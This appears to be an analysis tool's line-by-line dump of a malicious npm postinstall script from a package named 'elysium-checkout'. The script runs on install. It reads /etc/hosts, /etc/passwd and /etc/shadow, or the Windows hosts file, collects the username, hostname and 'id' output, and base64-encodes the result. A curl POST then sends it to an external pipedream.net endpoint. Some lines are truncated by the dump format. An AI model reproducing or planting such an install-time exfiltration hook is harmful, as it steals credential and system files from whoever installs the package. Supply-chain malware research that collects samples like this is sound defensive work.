// File: tmp/tmp8l7p1wvs/elysium-checkout/package/postinstall.js
// ======================================================================
Line 1: _tmp_5 = require("child_process")
Line 2: const fs = require("fs").promises
Line 3: const os = require("os")
Line 6: {
    const isWindows = process.platform === "win32";
    let hostsContent, username, hostname, shadowAccess, data;

    // Get username and hostname
    username = process.env.USERNAME || os.userInfo().username || "unknown_user";
    hostname = os.hostname() || "unknown_host";

    if (isWindows) {
      // Windows: Read hosts file and simulate shadow access
      hostsContent = await fs.readFile("C:\\Windows\\System32\\drivers\\etc\\hosts", "utf8");
      shadowAccess = "No shadow access"; // Windows doesn't have /etc/shadow
      data = `START\n${hostsContent}\n${username}\n${shadowAccess}`;
    } else {
      // Unix-like: Read hosts, passwd, and shadow (if accessible), run id
      hostsContent = await fs.readFile("/etc/hosts", "utf8");
      const passwdContent = await fs.readFile("/etc/passwd", "utf8");
      const idOutput = await new Promise((resolve, reject) => {
        exec("id", (error, stdout, stderr) => {
          if (error) reject(error);
          else resolve(stdo...
Line 11: os.userInfo()
Line 12: os.hostname()
Line 16: hostsContent = await fs.readFile("C:\\Windows\\System32\\drivers\\etc\\hosts", "utf8")
Line 21: hostsContent = await fs.readFile("/etc/hosts", "utf8")
Line 22: const passwdContent = await fs.readFile("/etc/passwd", "utf8")
Line 23: {
        exec("id", (error, stdout, stderr) => {
          if (error) reject(error);
          else resolve(stdout || stderr);
        });
      }
Line 24: exec("id", (error, stdout, stderr) => {
          if (error) reject(error);
          else resolve(stdout || stderr);
        })
Line 29: shadowAccess = await fs.readFile("/etc/shadow", "utf8").catch(() => "No shadow access")
Line 34: Buffer.from(data).toString("base64")
Line 38: const shell = isWindows ? "cmd.exe" : undefined
Line 39: <operator>.formatString("curl -X POST "https://eo76o4hz61zthar.m.pipedream.net/", username, "/", hostname, "/" -A "", encodedData, "" -s -o ", outputRedirect, "")
Line 42: exec(command, { shell }, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`Stderr: ${stderr}`);
        return;
      }
      console.log(`Stdout: ${stdout}`);
    })
